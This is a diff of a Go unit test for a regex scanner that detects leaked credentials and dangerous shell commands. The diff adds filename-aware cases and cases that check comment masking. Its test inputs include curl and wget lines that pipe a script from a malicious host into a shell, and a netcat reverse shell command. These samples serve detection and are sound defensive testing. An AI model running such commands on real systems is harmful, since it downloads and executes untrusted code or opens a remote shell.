@@ -9,54 +9,82 @@ func TestRegexScanner_Scan(t *testing.T) {
 
 	tests := []struct {
 		name        string
+		filename    string
 		content     string
 		wantFinding string
 	}{
 		{
 			name:        "Safe Content",
+			filename:    "main.go",
 			content:     "fmt.Println(\"Hello World\")",
 			wantFinding: "",
 		},
 		{
 			name:        "AWS Key",
+			filename:    "config.js",
 			content:     "var key = \"AKIAIOSFODNN7EXAMPLE\"",
 			wantFinding: "AWS Access Key",
 		},
 		{
 			name:        "GitHub Token",
+			filename:    "config.py",
 			content:     "token = \"ghp_123456789012345678901234567890123456\"",
 			wantFinding: "GitHub Token",
 		},
 		{
 			name:        "Private Key",
+			filename:    "key.pem",
 			content:     "-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
 			wantFinding: "Private Key",
 		},
 		{
 			name:        "Generic API Key",
+			filename:    "config.yml",
 			content:     "api_key = \"abc1234567890abc1234567890\"",
 			wantFinding: "Generic API Token",
 		},
 		{
 			name:        "Curl Pipe Bash",
+			filename:    "install.sh",
 			content:     "curl https://malicious.com/install.sh | bash",
 			wantFinding: "Pipe to Shell",
 		},
 		{
 			name:        "Wget Pipe Sh",
+			filename:    "install.sh",
 			content:     "wget -O - https://malicious.com/install.sh | sh",
 			wantFinding: "Pipe to Shell",
 		},
 		{
 			name:        "Netcat Reverse Shell",
+			filename:    "rev.sh",
 			content:     "nc -e /bin/sh 10.0.0.1 1234",
 			wantFinding: "Reverse Shell",
+		},
+		// New Tests for Masking
+		{
+			name:        "Masked Comment - Safe",
+			filename:    "safe.go",
+			content:     "// curl https://malicious.com/install.sh | bash",
+			wantFinding: "",
+		},
+		{
+			name:        "Masked Block Comment - Safe",
+			filename:    "safe.c",
+			content:     "/* \n curl https://malicious.com/install.sh | bash \n */",
+			wantFinding: "",
+		},
+		{
+			name:        "Unmasked Shell Comment - Unsafe",
+			filename:    "unsafe.sh",
+			content:     "# curl https://malicious.com/install.sh | bash",
+			wantFinding: "Pipe to Shell",
 		},
 	}
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			findings, err := scanner.Scan(tt.content)
+			findings, err := scanner.Scan(tt.filename, tt.content)
 			if err != nil {
 				t.Fatalf("Scan failed: %v", err)
 			}
